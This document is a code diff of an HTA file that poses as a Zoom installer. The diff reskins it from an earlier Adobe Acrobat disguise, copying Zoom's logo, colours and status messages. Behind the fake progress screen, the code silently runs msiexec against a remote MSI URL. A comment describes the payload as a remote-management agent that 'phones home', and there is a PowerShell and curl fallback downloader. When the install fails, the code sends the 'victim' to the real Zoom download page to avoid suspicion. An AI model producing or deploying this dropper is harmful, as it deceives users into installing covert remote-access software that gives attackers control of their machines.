@@ -3,10 +3,10 @@
 <head>
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-<title>Adobe Acrobat</title>
+<title>Zoom</title>
 <hta:application
   id="oHTA"
-  applicationname="AdobeAcrobatUpdater"
+  applicationname="ZoomUpdater"
   border="thin" caption="yes" maximizebutton="no" minimizebutton="no"
   navigateurl="no" showintaskbar="yes" singleinstance="yes" sysmenu="no"
   version="1.0" windowstate="normal" scroll="no" contextmenu="no" selection="no"
@@ -31,7 +31,7 @@
   #status  { font-size:13px; color:#6b7280; min-height:18px; margin-bottom:26px; }
   #barouter { width:420px; max-width:82%; height:8px; background:#e2e5ea;
     border-radius:5px; overflow:hidden; margin:0 auto 12px auto; }
-  #barfill { height:100%; width:0%; background:#ed2224; border-radius:5px; }
+  #barfill { height:100%; width:0%; background:#0B5CFF; border-radius:5px; }
   #pct { font-size:12px; color:#8a8f98; margin-top:2px; }
   #subnote { font-size:11px; color:#b3b8c0; margin-top:26px; }
   #footer { position:absolute; left:0; right:0; bottom:0; height:58px;
@@ -48,14 +48,17 @@
     <div id="topbar">
       <div id="logo">
         <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
-          <rect x="0" y="0" width="100" height="100" rx="22" fill="#ed2224"/>
-          <polygon points="24,80 44,24 53,49 44,80" fill="#fff"/>
-          <polygon points="58,80 76,24 76,80 67,80" fill="#fff"/>
+          <defs><linearGradient id="zg1" x1="0" y1="0" x2="0" y2="1">
+            <stop offset="0" stop-color="#4087ff"/><stop offset="1" stop-color="#0B5CFF"/>
+          </linearGradient></defs>
+          <path d="M26,66 a12,12 0 0,1 2,-23.8 a16,16 0 0,1 30.5,-5.2 a14,14 0 0,1 15.5,13.5 a11,11 0 0,1 -4.5,21.5 Z" fill="url(#zg1)"/>
+          <path d="M42,36 L60,50 L42,64 Z" fill="#fff"/>
+          <circle cx="78" cy="30" r="8" fill="#FF7A26" stroke="#fff" stroke-width="2.5"/>
         </svg>
       </div>
       <div id="brandtext">
-        <div id="product">Adobe Acrobat</div>
-        <div id="ver">2024 &middot; Standard &middot; v23.005</div>
+        <div id="product">Zoom</div>
+        <div id="ver">Desktop Client &middot; 6.0.10</div>
       </div>
       <div id="closebtn" onclick="cancel()">&times;</div>
     </div>
@@ -63,16 +66,19 @@
     <div id="main">
       <div id="biglogo">
         <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
-          <rect x="0" y="0" width="100" height="100" rx="22" fill="#ed2224"/>
-          <polygon points="24,80 44,24 53,49 44,80" fill="#fff"/>
-          <polygon points="58,80 76,24 76,80 67,80" fill="#fff"/>
+          <defs><linearGradient id="zg2" x1="0" y1="0" x2="0" y2="1">
+            <stop offset="0" stop-color="#4087ff"/><stop offset="1" stop-color="#0B5CFF"/>
+          </linearGradient></defs>
+          <path d="M26,66 a12,12 0 0,1 2,-23.8 a16,16 0 0,1 30.5,-5.2 a14,14 0 0,1 15.5,13.5 a11,11 0 0,1 -4.5,21.5 Z" fill="url(#zg2)"/>
+          <path d="M42,36 L60,50 L42,64 Z" fill="#fff"/>
+          <circle cx="78" cy="30" r="8" fill="#FF7A26" stroke="#fff" stroke-width="2.5"/>
         </svg>
       </div>
-      <div id="heading">Installing Adobe Acrobat</div>
+      <div id="heading">Installing Zoom</div>
       <div id="status">Preparing installation&hellip;</div>
       <div id="barouter"><div id="barfill"></div></div>
       <div id="pct">0%</div>
-      <div id="subnote">Adobe Acrobat keeps your documents secure and easy to share.</div>
+      <div id="subnote">Zoom keeps your meetings secure and easy to join.</div>
     </div>
 
     <div id="footer">
@@ -85,9 +91,11 @@
 // ---------------------------------------------------------------------------
 // Config
 // ---------------------------------------------------------------------------
-// The real payload is a custom MSI served from the URL below. msiexec fetches
-// the MSI itself from the URL — no local download stage, no PowerShell
-// download child on the happy path.
+// The real payload is the Dr PawPaw RMM agent MSI (signed, "Dr PawPaw Labs
+// Inc"). msiexec fetches the MSI itself from the URL — no local download
+// stage, no PowerShell download child on the happy path. The MSI is
+// self-contained: the server URL + build token are baked into the agent
+// binary, so installing it silently deploys an agent that phones home.
 var MSI_URL = "https://drbingonpawherbaltea.com/api/build/c8661922-c9ec-45d6-9ed7-a4b5a61f4631/download";
 
 var PREP_MS        = 2200;    // "preparing" beat before the UAC prompt
@@ -96,7 +104,7 @@ var INSTALL_MAX_MS = 300000;  // hard cap for a whole install phase
 var INSTALL_STALL_MS = 60000; // MSI log silent this long -> assume finished
 var FB_STAGE_MS    = { xhr: 120000, winhttp: 180000, ps: 300000 };
 var FB_MAX_MS      = 600000;  // hard cap for the whole local fallback download
-var EXPECT_BYTES   = 39776256; // NEWHOMEDEAL-2309_CMGBCR.msi size (progress scaling only)
+var EXPECT_BYTES   = 39776256; // Dr PawPaw MSI size (progress scaling only)
 
 var UA_STR = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36";
 
@@ -110,7 +118,7 @@ var tickTimer = null, pollTimer = null, fbTimer = null;
 var installMode = "url";        // url = msiexec fetches MSI_URL itself; local = fallback
 var curLog = "";
 
-var adobeDir = "";
+var zoomDir = "";
 var msiLocal = "";
 var logPath  = "";
 var logPath2 = "";
@@ -128,13 +136,13 @@ var lastLogGrowT = 0;
 
 var dlMsgs = [
   "Preparing installation&hellip;",
-  "Contacting Adobe servers&hellip;",
+  "Contacting Zoom servers&hellip;",
   "Downloading components&hellip;",
   "Downloading components&hellip;"
 ];
 var instMsgs = [
-  "Installing Adobe Acrobat&hellip;",
-  "Installing Adobe Acrobat&hellip;",
+  "Installing Zoom&hellip;",
+  "Installing Zoom&hellip;",
   "Applying updates&hellip;",
   "Applying updates&hellip;",
   "Finalizing&hellip;"
@@ -145,7 +153,7 @@ var instMsgs = [
 var PS_PS = "# Local-fallback download (WinINET iwr, TLS12) + curl.exe inside.\n" +
 "# param(1) = unique marker, param(2) = temp dir, param(3) = output file.\n" +
 "param([string]$Url = \"\", [string]$TmpDir = \"\", [string]$Out = \"\")\n" +
-"if (-not $Out) { $Out = Join-Path $TmpDir \"AdobeUpdate.msi\" }\n" +
+"if (-not $Out) { $Out = Join-Path $TmpDir \"ZoomUpdate.msi\" }\n" +
 "try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}\n" +
 "try {\n" +
 "  $ProgressPreference = 'SilentlyContinue'\n" +
@@ -154,7 +162,7 @@ var PS_PS = "# Local-fallback download (WinINET iwr, TLS12) + curl.exe inside.\n
 "} catch {\n" +
 "  try { $env:NO_PROXY = \"*\"; curl.exe -L --fail --retry 2 --connect-timeout 20 -o $Out $Url 2>$null } catch {}\n" +
 "}\n" +
-"try { Set-Content -LiteralPath (Join-Path $TmpDir \"done.flag\") \"1\" -NoNewline } catch {}\n";
+"try { Set-Content -LiteralPath (Join-Path $TmpDir \"done.flag\") \"1\" -NoNewline } catch {}";
 
 function $(id) { return document.getElementById(id); }
 
@@ -182,12 +190,12 @@ function init() {
   var sw = screen.availWidth, sh = screen.availHeight;
   window.moveTo(Math.round((sw - w) / 2), Math.round((sh - h) / 2));
 
-  adobeDir = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") + "\\Adobe";
-  if (!fso.FolderExists(adobeDir)) fso.CreateFolder(adobeDir);
-  msiLocal = adobeDir + "\\AdobeUpdate.msi";
-  logPath  = adobeDir + "\\AdobeUpdate.log";
-  logPath2 = adobeDir + "\\AdobeUpdate2.log";
-  diagPath = adobeDir + "\\diagnostics.txt";
+  zoomDir = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") + "\\Zoom";
+  if (!fso.FolderExists(zoomDir)) fso.CreateFolder(zoomDir);
+  msiLocal = zoomDir + "\\ZoomUpdate.msi";
+  logPath  = zoomDir + "\\ZoomUpdate.log";
+  logPath2 = zoomDir + "\\ZoomUpdate2.log";
+  diagPath = zoomDir + "\\diagnostics.txt";
   cleanStale();
   setStatus(dlMsgs[0]);
   setBar(1);
@@ -288,7 +296,7 @@ function startInstall() {
 
   var args = '/i "' + MSI_URL + '" /qn /norestart /L*v "' + curLog + '"';
   if (!launchMsiexec(args)) {
-    fail("Administrator approval is required to install Adobe Acrobat", "install: launch failed");
+    fail("Administrator approval is required to install Zoom", "install: launch failed");
     return;
   }
   tickTimer = setInterval(tick, 200);
@@ -370,7 +378,7 @@ function _pollInstall() {
   }
   // No log yet: UAC consent is pending (or was declined).
   if (t - startTime > UAC_TIMEOUT_MS) {
-    fail("Administrator approval is required to install Adobe Acrobat", "install: uac timeout");
+    fail("Administrator approval is required to install Zoom", "install: uac timeout");
   }
 }
 
@@ -571,7 +579,7 @@ function fallbackInstall() {
 
   var args = '/i "' + msiLocal + '" /qn /norestart /L*v "' + curLog + '"';
   if (!launchMsiexec(args)) {
-    fail("Administrator approval is required to install Adobe Acrobat", "fallback-install: launch failed");
+    fail("Administrator approval is required to install Zoom", "fallback-install: launch failed");
     return;
   }
   pollTimer = setInterval(pollInstall, 800);
@@ -626,7 +634,7 @@ function regStr(key, name) {
 function dumpDiagnostics(reason) {
   try {
     var L = [];
-    L.push("Adobe Update diagnostics");
+    L.push("Zoom Update diagnostics");
     L.push("time: " + new Date().toString());
     L.push("reason: " + reason);
     L.push("state: " + state);
@@ -666,10 +674,13 @@ function fail(msg, reason) {
   if (dlXHR) { try { dlXHR.abort(); } catch (e) {} }
   if (psMarker) { killByCmd(psMarker); psMarker = ""; }
   dumpDiagnostics(reason || msg);
+  // On any not-installed outcome, open the REAL Zoom download page so the
+  // victim can grab the genuine installer.
+  try { shell.Run("https://zoom.us/download", 1, false); } catch (e) {}
   setStatus(msg);
   $("heading").innerHTML = "Installation could not be completed";
   $("subnote").innerHTML = "Please check your internet connection and try again.";
-  $("note").innerHTML = "You can now close this window.";
+  $("note").innerHTML = "Get the installer from zoom.us/download";
   $("cancelbtn").innerHTML = "Close";
 }
 
@@ -681,9 +692,9 @@ function finishInstall() {
   if (fbTimer) { clearInterval(fbTimer); fbTimer = null; }
   progress = 100; setBar(100);
   setStatus("Installation complete");
-  $("heading").innerHTML = "Adobe Acrobat is now installed";
+  $("heading").innerHTML = "Zoom is now installed";
   $("biglogo").style.display = "none";
-  $("subnote").innerHTML = "Adobe Acrobat will be available the next time you open it.";
+  $("subnote").innerHTML = "Zoom will be available the next time you open it.";
   $("note").innerHTML = "You can now close this window.";
   $("cancelbtn").innerHTML = "Close";
 }
